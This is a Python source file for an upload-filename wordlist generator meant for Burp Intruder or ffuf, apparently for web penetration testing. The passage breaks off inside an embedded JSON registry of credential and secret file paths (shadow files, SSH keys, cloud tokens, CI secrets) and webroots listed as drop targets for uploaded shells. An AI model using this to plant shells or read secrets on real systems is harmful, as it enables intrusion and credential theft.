#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Upname.py — upload-filename wordlist generator (sibling of UpGen.py / UpMap.py).

Generates per-language .txt wordlists of mutated/injected filenames for use
with Burp Intruder, ffuf, or any tool that loops over filenames in an upload
multipart 'filename=' field.

Two selector groups:
  --technique  filter-bypass family — the filename is a vehicle that smuggles
               .php past validation (extension_shuffle, double_extension,
               null_byte_cutoff, stripping_extension, discrepancy,
               name_overflow, special_char_bypass, wordlist_fuzzer)
  --attack     injection family — the filename CARRIES a payload that fires
               when echoed/logged/queried/passed-to-shell (path_traversal_
               filename, xss_filename, sqli_filename, command_injection_
               filename)

Output:  out/<lang>/{technique,attack}/<name>[_raw|_urlenc].txt
         Plus optional out/<lang>/all.txt rollup via --mega.

Encoding split: techniques with binary or control bytes emit BOTH _raw.txt
(literal bytes — what Burp's multipart filename field expects) and
_urlenc.txt (printable, what already-encoded delivery layers consume).

paths.json integration: --file-read and --webroot accept @key.path lookups
into the registry that ships next to this script.
"""

import argparse
import json
import os
import random
import sys
from pathlib import Path
from urllib.parse import quote

# Per-tool identity (kept in lockstep with UpMap.TOOL_* / UpGen.TOOL_*)
TOOL_NAME    = "Upname"
TOOL_TAGLINE = "Upload-Filename Wordlist Generator"
TOOL_VERSION = "1.0"

# Windows console defaults to cp1252; force UTF-8 so the → arrow and any
# non-ASCII bytes inside payloads print without UnicodeEncodeError.
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ─────────────────────────────────────────────────────────────────────────────
# COLORS, PRINT HELPERS, BANNER
# Ported verbatim from UpMap.py so the three tools render identically.
# ─────────────────────────────────────────────────────────────────────────────

# ── ANSI palette ─────────────────────────────────────────────────────────────
R   = "\033[38;5;196m"   # bright red
G   = "\033[38;5;82m"    # matrix green
Y   = "\033[38;5;220m"   # gold / warning
B   = "\033[38;5;39m"    # electric blue
C   = "\033[38;5;51m"    # cyber cyan
M   = "\033[38;5;201m"   # hot magenta  (findings)
W   = "\033[1;97m"       # bold white
DG  = "\033[38;5;240m"   # dim grey
OR  = "\033[38;5;208m"   # orange accent
RS  = "\033[0m"

BLD = "\033[1m"          # bold
DIM = "\033[2m"          # dim

# ── Labelled print helpers ───────────────────────────────────────────────────
def success(msg): print(f"  {G}{BLD}[+]{RS} {W}{msg}{RS}")
def failure(msg): print(f"  {DG}[-]{RS} {DG}{msg}{RS}")
def info(msg):    print(f"  {C}{BLD}[*]{RS} {msg}")
def warn(msg):    print(f"  {Y}{BLD}[!]{RS} {Y}{msg}{RS}")
def err(msg):     print(f"  {R}{BLD}[ERR]{RS} {R}{msg}{RS}")

def section(title):
    pad = (60 - len(title) - 2) // 2
    print(f"\n  {DG}{'─' * pad}{RS} {C}{BLD}{title}{RS} {DG}{'─' * pad}{RS}")

# 0xBugatti signature logo (cyan dot-art). Verbatim from UpMap.py.
LOGO_ART = [
    "                        ...........",
    "                   .....................",
    "               ..............................",
    "            .....................................",
    "          .......................................:.",
    "        ........................................::::.",
    "      .........................  ...............::::::.",
    "       .........   .     ......   ...............::::::.",
    "            .                      ................::::..",
    "                                   .......................",
    "                                   ..::....................",
    "                                   .:::::::.................",
    ".                                  .::::::::::::............",
    "..                           ..    ::::::::::::::::::.......",
    "..        ...              ..     .::::::::::::::::::.......",
    "..           .:.         .:.       :::::::::::::::::::......",
    "..             .:.      .:         .::::::::::::::::::......",
    " .               .:.  ..:          .::::::::::::::::........",
    " .                .:.  :.          .:::::::::::::::........",
    "                   :...:            .::..:::::::::........",
    "                    .....           .::.....::...........",
    "                   . .. .           ....................",
    "                   . ...            ...................",
    "                     .... .          .................",
    "                     :... ::::.      ...............",
    "                     : .:.00000:.     ............",
    "                  :::: ..:0000000::::::::......",
    "                 :000.  .:0000000000000000:",
    "                        .000000000000:",
    "                           .:00:.",
]

def banner():
    """Print the shared logo + per-tool tagline + version line. Centered to
    the logo's visual width so the three tools (UpMap, UpGen, Upname) print
    identical headers up to the tagline text."""
    print()
    full_w = max(len(r) for r in LOGO_ART)

    def centered(plain, lead="", trail=""):
        pad = max(0, (full_w - len(plain)) // 2)
        return f"  {' ' * pad}{lead}{plain}{trail}"

    for row in LOGO_ART:
        print(f"  {C}{row}{RS}")
    print()
    print(centered(TOOL_NAME, lead=f"{C}{BLD}", trail=RS))
    print(centered(TOOL_TAGLINE, lead=W, trail=RS))
    print(centered(f"v{TOOL_VERSION}  •  by @0xbugatti",
                   lead=f"{DG}", trail=RS).replace("@0xbugatti",
                                                   f"{RS}{M}{BLD}@0xbugatti{RS}{DG}") + RS)
    print()


# ─── BEGIN EMBEDDED PATHS (auto-generated by _embed_paths.py) ────────────
# Source of truth: paths.json (sibling file). Re-embed: _embed_paths.py.
_EMBEDDED_PATHS_JSON = r'''
{
  "$schema_version": 1,
  "$description": "Canonical known-file-paths registry. Consumed by UpMap, UpGen, and Upname to populate --file-read overrides (XXE/LFI/SSRF targets) and to build path-traversal payloads (../../../{path}) in Upname's filename-injection attack family.",
  "$consumers": {
    "UpMap.py":  "--file-read PATH routes every _lfi(ctx, …) site through the registry (XXE/SSI/SSRF/CSV/Ghostscript). Accepts a literal path OR @key.path into .linux / .windows / .devops_cloud / .cloud_metadata_endpoints.",
    "UpGen.py":  "--file-read PATH routes every _lfi/_lfi_urlenc/_lfi_charref site through the registry. Accepts the same literal-or-@key forms.",
    "Upname.py": "path_traversal attack reads .webroots.<lang>.<os> as the drop target and .linux / .windows / .devops_cloud / .cloud_metadata_endpoints as the read target."
  },
  "$placeholders": {
    "{USER}":       "non-root username on shared hosting / multi-user box",
    "{DOMAIN}":     "vhost domain name (e.g. example.com)",
    "{APP}":        "IIS site/application name",
    "{VERSION}":    "tool-specific version segment (e.g. PHP 8.2, PostgreSQL 14)",
    "{TOMCAT_VER}": "Tomcat major.minor (e.g. 9.0, 10.1)",
    "{YYMMDD}":     "IIS log date suffix",
    "{HOSTNAME}":   "machine short hostname (used in MySQL/XAMPP .err file names)"
  },

  "linux": {
    "system_info": [
      "/etc/passwd",
      "/etc/group",
      "/etc/hostname",
      "/etc/hosts",
      "/etc/issue",
      "/etc/issue.net",
      "/etc/os-release",
      "/etc/lsb-release",
      "/etc/redhat-release",
      "/etc/debian_version",
      "/etc/motd",
      "/etc/timezone",
      "/etc/machine-id",
      "/etc/fstab",
      "/etc/profile",
      "/etc/bash.bashrc",
      "/etc/environment"
    ],

    "network": [
      "/etc/resolv.conf",
      "/etc/network/interfaces",
      "/etc/netplan/01-netcfg.yaml",
      "/etc/netplan/50-cloud-init.yaml",
      "/etc/sysconfig/network",
      "/etc/sysconfig/network-scripts/ifcfg-eth0",
      "/proc/net/tcp",
      "/proc/net/tcp6",
      "/proc/net/udp",
      "/proc/net/route",
      "/proc/net/arp",
      "/proc/net/fib_trie",
      "/proc/net/unix",
      "/etc/iptables/rules.v4",
      "/etc/iptables/rules.v6",
      "/etc/nftables.conf"
    ],

    "process_runtime": [
      "/proc/self/environ",
      "/proc/self/cmdline",
      "/proc/self/status",
      "/proc/self/stat",
      "/proc/self/maps",
      "/proc/self/cwd",
      "/proc/self/exe",
      "/proc/self/root",
      "/proc/self/fd/0",
      "/proc/self/fd/1",
      "/proc/self/fd/2",
      "/proc/self/fd/3",
      "/proc/self/io",
      "/proc/self/limits",
      "/proc/self/mountinfo",
      "/proc/self/mounts",
      "/proc/version",
      "/proc/cmdline",
      "/proc/cpuinfo",
      "/proc/meminfo",
      "/proc/mounts",
      "/proc/loadavg",
      "/proc/uptime",
      "/proc/modules",
      "/proc/1/environ",
      "/proc/1/cmdline",
      "/proc/1/status"
    ],

    "credentials": [
      "/etc/shadow",
      "/etc/gshadow",
      "/etc/sudoers",
      "/etc/sudoers.d/",
      "/etc/security/opasswd",
      "/etc/security/passwd",
      "/etc/security/group",
      "/etc/pam.d/common-auth",
      "/root/.ssh/id_rsa",
      "/root/.ssh/id_dsa",
      "/root/.ssh/id_ecdsa",
      "/root/.ssh/id_ed25519",
      "/root/.ssh/authorized_keys",
      "/root/.ssh/known_hosts",
      "/root/.ssh/config",
      "/home/{USER}/.ssh/id_rsa",
      "/home/{USER}/.ssh/id_ed25519",
      "/home/{USER}/.ssh/authorized_keys",
      "/home/{USER}/.ssh/known_hosts",
      "/home/{USER}/.ssh/config",
      "/etc/ssh/sshd_config",
      "/etc/ssh/ssh_config",
      "/etc/ssh/ssh_host_rsa_key",
      "/etc/ssh/ssh_host_ecdsa_key",
      "/etc/ssh/ssh_host_ed25519_key",
      "/etc/ssh/ssh_host_dsa_key",
      "/root/.netrc",
      "/home/{USER}/.netrc",
      "/root/.pgpass",
      "/home/{USER}/.pgpass",
      "/root/.my.cnf",
      "/home/{USER}/.my.cnf"
    ],

    "shell_history": [
      "/root/.bash_history",
      "/root/.zsh_history",
      "/root/.sh_history",
      "/root/.ash_history",
      "/root/.lesshst",
      "/root/.viminfo",
      "/root/.nano_history",
      "/root/.python_history",
      "/root/.mysql_history",
      "/root/.psql_history",
      "/root/.rediscli_history",
      "/root/.sqlite_history",
      "/root/.node_repl_history",
      "/root/.irb_history",
      "/root/.local/share/recently-used.xbel",
      "/home/{USER}/.bash_history",
      "/home/{USER}/.zsh_history",
      "/home/{USER}/.python_history",
      "/home/{USER}/.mysql_history",
      "/home/{USER}/.psql_history",
      "/home/{USER}/.viminfo",
      "/home/{USER}/.lesshst"
    ],

    "logs": [
      "/var/log/auth.log",
      "/var/log/syslog",
      "/var/log/messages",
      "/var/log/secure",
      "/var/log/dmesg",
      "/var/log/kern.log",
      "/var/log/boot.log",
      "/var/log/wtmp",
      "/var/log/btmp",
      "/var/log/lastlog",
      "/var/log/utmp",
      "/var/log/faillog",
      "/var/log/audit/audit.log",
      "/var/log/cron",
      "/var/log/cron.log",
      "/var/log/maillog",
      "/var/log/mail.log",
      "/var/log/apache2/access.log",
      "/var/log/apache2/error.log",
      "/var/log/apache2/other_vhosts_access.log",
      "/var/log/httpd/access_log",
      "/var/log/httpd/error_log",
      "/var/log/nginx/access.log",
      "/var/log/nginx/error.log",
      "/var/log/mysql/error.log",
      "/var/log/mysql/mysql.log",
      "/var/log/mysql/mysql-slow.log",
      "/var/log/mariadb/mariadb.log",
      "/var/log/postgresql/postgresql-{VERSION}-main.log",
      "/var/log/redis/redis-server.log",
      "/var/log/php_errors.log",
      "/var/log/php-fpm/error.log",
      "/var/log/tomcat9/catalina.out",
      "/var/log/tomcat/catalina.out"
    ],

    "scheduled_tasks": [
      "/etc/crontab",
      "/etc/cron.d/",
      "/etc/cron.hourly/",
      "/etc/cron.daily/",
      "/etc/cron.weekly/",
      "/etc/cron.monthly/",
      "/etc/anacrontab",
      "/var/spool/cron/crontabs/root",
      "/var/spool/cron/crontabs/{USER}",
      "/var/spool/cron/{USER}",
      "/etc/at.allow",
      "/etc/at.deny",
      "/etc/systemd/system/",
      "/lib/systemd/system/",
      "/usr/lib/systemd/system/"
    ],

    "mail_spool": [
      "/var/spool/mail/root",
      "/var/spool/mail/{USER}",
      "/var/mail/root",
      "/var/mail/{USER}",
      "/var/spool/exim4/input/",
      "/var/spool/postfix/maildrop/"
    ],

    "app_configs": [
      "/etc/php/{VERSION}/fpm/php.ini",
      "/etc/php/{VERSION}/cli/php.ini",
      "/etc/php/{VERSION}/fpm/pool.d/www.conf",
      "/etc/php.ini",
      "/usr/local/etc/php/php.ini",
      "/etc/mysql/my.cnf",
      "/etc/mysql/mariadb.conf.d/50-server.cnf",
      "/etc/mysql/conf.d/mysql.cnf",
      "/etc/postgresql/{VERSION}/main/postgresql.conf",
      "/etc/postgresql/{VERSION}/main/pg_hba.conf",
      "/etc/redis/redis.conf",
      "/etc/redis.conf",
      "/etc/memcached.conf",
      "/etc/mongod.conf",
      "/etc/elasticsearch/elasticsearch.yml",
      "/etc/apache2/apache2.conf",
      "/etc/apache2/ports.conf",
      "/etc/apache2/sites-enabled/000-default.conf",
      "/etc/apache2/sites-available/default-ssl.conf",
      "/etc/apache2/mods-enabled/",
      "/etc/httpd/conf/httpd.conf",
      "/etc/httpd/conf.d/ssl.conf",
      "/etc/nginx/nginx.conf",
      "/etc/nginx/sites-enabled/default",
      "/etc/nginx/conf.d/default.conf",
      "/etc/proftpd/proftpd.conf",
      "/etc/vsftpd.conf",
      "/etc/pure-ftpd/pure-ftpd.conf",
      "/etc/samba/smb.conf",
      "/etc/squid/squid.conf",
      "/etc/openvpn/server.conf",
      "/etc/openvpn/client.conf",
      "/etc/wireguard/wg0.conf",
      "/etc/strongswan/ipsec.conf",
      "/etc/strongswan/ipsec.secrets",
      "/etc/freeradius/3.0/clients.conf"
    ]
  },

  "windows": {
    "system_info": [
      "C:/Windows/win.ini",
      "C:/Windows/system.ini",
      "C:/Windows/System32/drivers/etc/hosts",
      "C:/Windows/System32/drivers/etc/networks",
      "C:/Windows/System32/drivers/etc/services",
      "C:/Windows/System32/drivers/etc/protocol",
      "C:/Windows/System32/drivers/etc/lmhosts.sam",
      "C:/Windows/php.ini",
      "C:/Windows/my.ini",
      "C:/Windows/php/php.ini",
      "C:/boot.ini",
      "C:/autoexec.bat",
      "C:/Windows/setupact.log",
      "C:/Windows/setuperr.log"
    ],

    "registry_hives": [
      "C:/Windows/System32/config/SAM",
      "C:/Windows/System32/config/SYSTEM",
      "C:/Windows/System32/config/SECURITY",
      "C:/Windows/System32/config/SOFTWARE",
      "C:/Windows/System32/config/DEFAULT",
      "C:/Windows/System32/config/RegBack/SAM",
      "C:/Windows/System32/config/RegBack/SYSTEM",
      "C:/Windows/System32/config/RegBack/SECURITY",
      "C:/Windows/System32/config/RegBack/SOFTWARE",
      "C:/Windows/repair/sam",
      "C:/Windows/repair/system",
      "C:/Windows/repair/security",
      "C:/Windows/repair/software"
    ],

    "credentials": [
      "C:/unattend.xml",
      "C:/unattended.xml",
      "C:/Windows/Panther/Unattend.xml",
      "C:/Windows/Panther/Unattend/Unattended.xml",
      "C:/Windows/Panther/Unattended.xml",
      "C:/Windows/Panther/UnattendGC/setupact.log",
      "C:/Windows/System32/sysprep/sysprep.xml",
      "C:/Windows/System32/sysprep/sysprep.inf",
      "C:/sysprep.inf",
      "C:/sysprep.xml",
      "C:/Windows/debug/NetSetup.LOG",
      "C:/Windows/System32/config/SecEvent.Evt",
      "C:/ProgramData/Microsoft/Group Policy/History/",
      "C:/Users/{USER}/.ssh/id_rsa",
      "C:/Users/{USER}/.ssh/id_ed25519",
      "C:/Users/{USER}/.ssh/authorized_keys",
      "C:/Users/{USER}/.ssh/config",
      "C:/Users/Administrator/.ssh/id_rsa",
      "C:/ProgramData/ssh/sshd_config"
    ],

    "shell_history": [
      "C:/Users/{USER}/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
      "C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
      "C:/Users/{USER}/AppData/Local/Microsoft/Windows/History/History.IE5/",
      "C:/Users/{USER}/AppData/Roaming/Microsoft/Windows/Recent/"
    ],

    "logs": [
      "C:/inetpub/logs/LogFiles/W3SVC1/u_ex{YYMMDD}.log",
      "C:/Windows/System32/LogFiles/W3SVC1/u_ex{YYMMDD}.log",
      "C:/Windows/System32/LogFiles/HTTPERR/httperr1.log",
      "C:/Windows/System32/winevt/Logs/Security.evtx",
      "C:/Windows/System32/winevt/Logs/System.evtx",
      "C:/Windows/System32/winevt/Logs/Application.evtx",
      "C:/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx",
      "C:/xampp/apache/logs/access.log",
      "C:/xampp/apache/logs/error.log",
      "C:/xampp/mysql/data/{HOSTNAME}.err",
      "C:/wamp/logs/access.log",
      "C:/wamp/logs/apache_error.log",
      "C:/wamp/logs/mysql.log",
      "C:/Program Files/Apache Software Foundation/Tomcat {TOMCAT_VER}/logs/catalina.{YYMMDD}.log",
      "C:/Program Files/Apache Software Foundation/Tomcat {TOMCAT_VER}/logs/localhost.{YYMMDD}.log",
      "C:/Program Files/MySQL/MySQL Server {VERSION}/data/{HOSTNAME}.err"
    ],

    "iis": [
      "C:/inetpub/wwwroot/web.config",
      "C:/inetpub/wwwroot/{APP}/web.config",
      "C:/Windows/System32/inetsrv/config/applicationHost.config",
      "C:/Windows/System32/inetsrv/config/administration.config",
      "C:/Windows/System32/inetsrv/config/redirection.config",
      "C:/Windows/System32/inetsrv/MetaBase.xml",
      "C:/inetpub/temp/IIS Temporary Compressed Files/",
      "C:/inetpub/history/"
    ],

    "third_party_creds": [
      "C:/Users/{USER}/AppData/Roaming/WinSCP.ini",
      "C:/Users/{USER}/AppData/Roaming/FileZilla/sitemanager.xml",
      "C:/Users/{USER}/AppData/Roaming/FileZilla/recentservers.xml",
      "C:/Users/{USER}/AppData/Roaming/FileZilla/filezilla.xml",
      "C:/ProgramData/Microsoft/Crypto/RSA/MachineKeys/",
      "C:/Program Files/PuTTY/sessions/",
      "C:/ProgramData/PuTTY/sessions/",
      "C:/Users/{USER}/.aws/credentials",
      "C:/Users/{USER}/.aws/config",
      "C:/Users/{USER}/.kube/config",
      "C:/Users/{USER}/.docker/config.json",
      "C:/Users/{USER}/AppData/Roaming/gcloud/credentials.db",
      "C:/Users/{USER}/AppData/Roaming/gcloud/application_default_credentials.json",
      "C:/Users/{USER}/.azure/accessTokens.json",
      "C:/Users/{USER}/.azure/azureProfile.json",
      "C:/Users/{USER}/AppData/Roaming/Mozilla/Firefox/Profiles/",
      "C:/Users/{USER}/AppData/Local/Google/Chrome/User Data/Default/Login Data",
      "C:/Users/{USER}/AppData/Local/Microsoft/Edge/User Data/Default/Login Data"
    ]
  },

  "webroots": {
    "$note": "Per-language drop targets for shell uploads after a successful path-traversal escape. The traversal payload becomes: ../../../{webroot}/{stem}.{ext}. Languages here mirror UpMap's MODULE_LANG and UpGen's ALL_LANGS.",

    "php": {
      "linux": [
        "/var/www/html/",
        "/var/www/",
        "/var/www/public/",
        "/usr/share/nginx/html/",
        "/etc/nginx/html/",
        "/srv/www/htdocs/",
        "/srv/http/",
        "/srv/www/",
        "/opt/lampp/htdocs/",
        "/opt/bitnami/apache2/htdocs/",
        "/home/{USER}/public_html/",
        "/home/{USER}/www/",
        "/var/www/vhosts/{DOMAIN}/httpdocs/",
        "/var/www/{DOMAIN}/public_html/"
      ],
      "windows": [
        "C:/xampp/htdocs/",
        "C:/wamp/www/",
        "C:/wamp64/www/",
        "C:/Apache24/htdocs/",
        "C:/Program Files/Apache Group/Apache2/htdocs/",
        "C:/Program Files (x86)/Apache Group/Apache2/htdocs/",
        "C:/inetpub/wwwroot/"
      ]
    },

    "asp": {
      "$note": "Classic ASP — Windows / IIS only.",
      "windows": [
        "C:/inetpub/wwwroot/",
        "C:/inetpub/wwwroot/{APP}/",
        "C:/inetpub/vhosts/{DOMAIN}/httpdocs/"
      ]
    },

    "aspx": {
      "$note": "ASP.NET — Windows / IIS only.",
      "windows": [
        "C:/inetpub/wwwroot/",
        "C:/inetpub/wwwroot/{APP}/",
        "C:/inetpub/wwwroot/{APP}/bin/",
        "C:/inetpub/wwwroot/{APP}/App_Code/",
        "C:/inetpub/vhosts/{DOMAIN}/httpdocs/"
      ]
    },

    "jsp": {
      "linux": [
        "/opt/tomcat/webapps/ROOT/",
        "/opt/tomcat/webapps/{APP}/",
        "/usr/local/tomcat/webapps/ROOT/",
        "/usr/share/tomcat9/webapps/ROOT/",
        "/var/lib/tomcat/webapps/ROOT/",
        "/var/lib/tomcat9/webapps/ROOT/",
        "/var/lib/tomcat10/webapps/ROOT/",
        "/opt/jetty/webapps/ROOT/",
        "/usr/share/jetty9/webapps/ROOT/",
        "/opt/wildfly/standalone/deployments/",
        "/opt/jboss/standalone/deployments/"
      ],
      "windows": [
        "C:/Program Files/Apache Software Foundation/Tomcat {TOMCAT_VER}/webapps/ROOT/",
        "C:/Tomcat/webapps/ROOT/",
        "C:/Tomcat{TOMCAT_VER}/webapps/ROOT/",
        "C:/Program Files/Jetty/webapps/ROOT/"
      ]
    },

    "coldfusion": {
      "linux": [
        "/opt/coldfusion{VERSION}/wwwroot/",
        "/opt/coldfusion/wwwroot/",
        "/opt/lucee/tomcat/webapps/ROOT/"
      ],
      "windows": [
        "C:/ColdFusion{VERSION}/wwwroot/",
        "C:/ColdFusion/wwwroot/",
        "C:/JRun4/servers/lib/wwwroot/",
        "C:/lucee/tomcat/webapps/ROOT/"
      ]
    },

    "perl_cgi": {
      "$note": "Generic CGI dir — Perl, Python, Ruby, Bash CGI scripts execute when dropped here.",
      "linux": [
        "/usr/lib/cgi-bin/",
        "/var/www/cgi-bin/",
        "/var/www/html/cgi-bin/",
        "/usr/local/apache2/cgi-bin/",
        "/srv/www/cgi-bin/",
        "/home/{USER}/cgi-bin/"
      ],
      "windows": [
        "C:/Apache24/cgi-bin/",
        "C:/xampp/cgi-bin/",
        "C:/wamp/cgi-bin/"
      ]
    },

    "static": {
      "$note": "Plain document roots — useful for dropping HTML/JS (XSS landing pages) or static config files.",
      "linux": [
        "/var/www/html/",
        "/usr/share/nginx/html/",
        "/srv/http/"
      ],
      "windows": [
        "C:/inetpub/wwwroot/",
        "C:/xampp/htdocs/"
      ]
    }
  },

  "devops_cloud": {
    "docker": [
      "/var/run/docker.sock",
      "/.dockerenv",
      "/etc/docker/daemon.json",
      "/etc/docker/key.json",
      "/var/lib/docker/containers/",
      "/var/lib/docker/image/",
      "/var/lib/docker/volumes/",
      "/root/.docker/config.json",
      "/home/{USER}/.docker/config.json",
      "C:/ProgramData/Docker/config/daemon.json",
      "C:/Users/{USER}/.docker/config.json"
    ],

    "kubernetes": [
      "/var/run/secrets/kubernetes.io/serviceaccount/token",
      "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
      "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
      "/etc/kubernetes/admin.conf",
      "/etc/kubernetes/kubelet.conf",
      "/etc/kubernetes/scheduler.conf",
      "/etc/kubernetes/controller-manager.conf",
      "/etc/kubernetes/pki/ca.crt",
      "/etc/kubernetes/pki/ca.key",
      "/etc/kubernetes/pki/apiserver.crt",
      "/etc/kubernetes/pki/apiserver.key",
      "/etc/kubernetes/pki/apiserver-kubelet-client.key",
      "/etc/kubernetes/pki/etcd/ca.crt",
      "/etc/kubernetes/pki/etcd/server.key",
      "/etc/kubernetes/manifests/",
      "/var/lib/kubelet/config.yaml",
      "/var/lib/kubelet/kubeadm-flags.env",
      "/var/lib/kubelet/pki/kubelet-client-current.pem",
      "/root/.kube/config",
      "/home/{USER}/.kube/config",
      "C:/Users/{USER}/.kube/config"
    ],

    "aws": [
      "/root/.aws/credentials",
      "/root/.aws/config",
      "/home/{USER}/.aws/credentials",
      "/home/{USER}/.aws/config",
      "/home/{USER}/.aws/cli/cache/",
      "/etc/aws/credentials",
      "C:/Users/{USER}/.aws/credentials",
      "C:/Users/{USER}/.aws/config"
    ],

    "gcp": [
      "/root/.config/gcloud/credentials.db",
      "/root/.config/gcloud/access_tokens.db",
      "/root/.config/gcloud/application_default_credentials.json",
      "/root/.config/gcloud/active_config",
      "/root/.config/gcloud/configurations/config_default",
      "/root/.config/gcloud/legacy_credentials/",
      "/home/{USER}/.config/gcloud/credentials.db",
      "/home/{USER}/.config/gcloud/application_default_credentials.json",
      "C:/Users/{USER}/AppData/Roaming/gcloud/credentials.db",
      "C:/Users/{USER}/AppData/Roaming/gcloud/application_default_credentials.json"
    ],

    "azure": [
      "/root/.azure/accessTokens.json",
      "/root/.azure/azureProfile.json",
      "/root/.azure/clouds.config",
      "/root/.azure/msal_token_cache.json",
      "/root/.azure/service_principal_entries.json",
      "/home/{USER}/.azure/accessTokens.json",
      "/home/{USER}/.azure/azureProfile.json",
      "C:/Users/{USER}/.azure/accessTokens.json",
      "C:/Users/{USER}/.azure/azureProfile.json",
      "C:/Users/{USER}/.azure/msal_token_cache.json"
    ],

    "cicd": [
      "/var/lib/jenkins/secrets/master.key",
      "/var/lib/jenkins/secrets/hudson.util.Secret",
      "/var/lib/jenkins/secrets/initialAdminPassword",
      "/var/lib/jenkins/credentials.xml",
      "/var/lib/jenkins/jobs/",
      "/var/lib/jenkins/users/",
      "/var/lib/jenkins/config.xml",
      "/home/jenkins/.ssh/id_rsa",
      "/home/jenkins/workspace/",
      "/home/gitlab-runner/.gitlab-runner/config.toml",
      "/etc/gitlab-runner/config.toml",
      "/var/opt/gitlab/gitlab-rails/etc/secrets.yml",
      "/var/opt/gitlab/postgresql/data/pg_hba.conf",
      "C:/ProgramData/GitLab-Runner/config.toml",
      "C:/Program Files/Jenkins/secrets/master.key",
      "./.github/workflows/",
      "./.gitlab-ci.yml",
      "./Jenkinsfile",
      "./.circleci/config.yml",
      "./.drone.yml",
      "./bitbucket-pipelines.yml",
      "./azure-pipelines.yml",
      "./.travis.yml",
      "./buildspec.yml",
      "./cloudbuild.yaml"
    ],

    "scm": [
      "/.git/config",
      "/.git/HEAD",
      "/.git/credentials",
      "/.git/logs/HEAD",
      "/.git/index",
      "/.git/packed-refs",
      "/.git/info/exclude",
      "/.gitconfig",
      "/root/.gitconfig",
      "/root/.git-credentials",
      "/home/{USER}/.gitconfig",
      "/home/{USER}/.git-credentials",
      "/.svn/entries",
      "/.svn/wc.db",
      "/.svn/all-wcprops",
      "/.hg/store/",
      "/.hg/hgrc",
      "/.bzr/branch/branch.conf",
      "/CVS/Root",
      "/CVS/Entries"
    ],

    "iac": [
      "./terraform.tfstate",
      "./terraform.tfstate.backup",
      "./.terraform/terraform.tfstate",
      "./.terraform.lock.hcl",
      "./terraform.tfvars",
      "./secrets.auto.tfvars",
      "./packer.json",
      "/etc/ansible/hosts",
      "/etc/ansible/ansible.cfg",
      "/home/{USER}/.ansible/cp/",
      "/home/{USER}/.ansible.cfg",
      "./ansible.cfg",
      "./inventory",
      "/etc/salt/master",
      "/etc/salt/minion",
      "/etc/salt/pki/master/master.pem",
      "/etc/salt/pki/minion/minion.pem",
      "/etc/chef/client.rb",
      "/etc/chef/client.pem",
      "/etc/chef/validation.pem",
      "/etc/puppet/puppet.conf",
      "/etc/puppetlabs/puppet/ssl/private_keys/",
      "/etc/cfengine/ppkeys/localhost.priv"
    ],

    "secrets_managers": [
      "/var/lib/vault/",
      "/etc/vault.d/vault.hcl",
      "/etc/vault.d/agent.hcl",
      "/opt/vault/data/",
      "/opt/consul/data/",
      "/etc/consul.d/",
      "/etc/consul/server.json",
      "/var/lib/etcd/",
      "/etc/etcd/etcd.conf",
      "/etc/etcd/ssl/etcd-server.pem"
    ],

    "containers_runtime": [
      "/proc/1/cgroup",
      "/sys/fs/cgroup/",
      "/run/containerd/containerd.sock",
      "/var/run/containerd/containerd.sock",
      "/run/crio/crio.sock",
      "/var/run/crio/crio.sock",
      "/etc/containerd/config.toml",
      "/etc/crio/crio.conf"
    ],

    "env_files": [
      "./.env",
      "./.env.local",
      "./.env.production",
      "./.env.development",
      "./.env.staging",
      "./.env.test",
      "/etc/environment",
      "/etc/default/locale",
      "./config.yaml",
      "./config.yml",
      "./settings.yaml",
      "./application.properties",
      "./application.yml"
    ],

    "databases": [
      "/var/lib/mysql/mysql/user.MYD",
      "/var/lib/mysql/ibdata1",
      "/var/lib/mysql/mysql.sock",
      "/var/lib/postgresql/{VERSION}/main/base/",
      "/var/lib/postgresql/{VERSION}/main/postmaster.pid",
      "/var/lib/redis/dump.rdb",
      "/var/lib/mongodb/",
      "/var/lib/elasticsearch/",
      "/var/backups/dump.sql",
      "/tmp/dump.sql",
      "/tmp/backup.tar.gz"
    ]
  },

  "cloud_metadata_endpoints": {
    "$note": "FILE-BASED cloud instance-metadata artifacts written to disk at boot by cloud-init / waagent / GCE guest agent. LFI-safe: every leaf here is a real local file. URL counterparts live under .ssrf_targets (consumed by the SSRF module, not by --file-read).",

    "aws": [
      "/var/lib/cloud/data/instance-id",
      "/var/lib/cloud/data/previous-instance-id",
      "/var/lib/cloud/data/result.json",
      "/var/lib/cloud/data/status.json",
      "/var/lib/cloud/instance/user-data.txt",
      "/var/lib/cloud/instance/user-data.txt.i",
      "/var/lib/cloud/instance/obj.pkl",
      "/var/lib/cloud/instance/cloud-config.txt",
      "/var/lib/cloud/instance/scripts/runcmd",
      "/var/lib/cloud/instance/sem/config_scripts_user",
      "/var/lib/cloud/seed/nocloud-net/meta-data",
      "/var/lib/cloud/seed/nocloud-net/user-data",
      "/var/log/cloud-init.log",
      "/var/log/cloud-init-output.log",
      "/etc/ec2_version",
      "/etc/aws/credentials",
      "/run/cloud-init/instance-data.json",
      "/run/cloud-init/result.json",
      "/run/cloud-init/status.json"
    ],

    "gcp": [
      "/var/lib/google/instance_id",
      "/var/lib/google/oslogin.cache",
      "/var/lib/google-cloud-ops-agent/log/health-checks.log",
      "/etc/default/instance_configs.cfg",
      "/var/log/google_metadata_script_runner.log",
      "/var/log/google-startup-scripts.log",
      "/var/log/google-shutdown-scripts.log",
      "/var/lib/cloud/instance/scripts/runcmd",
      "/run/cloud-init/instance-data.json"
    ],

    "azure": [
      "/var/lib/waagent/ovf-env.xml",
      "/var/lib/waagent/CustomData",
      "/var/lib/waagent/Incarnation",
      "/var/lib/waagent/GoalState.1.xml",
      "/var/lib/waagent/HostingEnvironmentConfig.xml",
      "/var/lib/waagent/SharedConfig.xml",
      "/var/lib/waagent/Certificates.xml",
      "/var/lib/waagent/TransportPrivate.pem",
      "/var/lib/waagent/TransportCert.pem",
      "/var/log/waagent.log",
      "/var/log/azure/cluster-provision.log",
      "/var/log/azure/custom-script/handler.log",
      "/etc/waagent.conf",
      "C:/WindowsAzure/Logs/WaAppAgent.log",
      "C:/WindowsAzure/Config/",
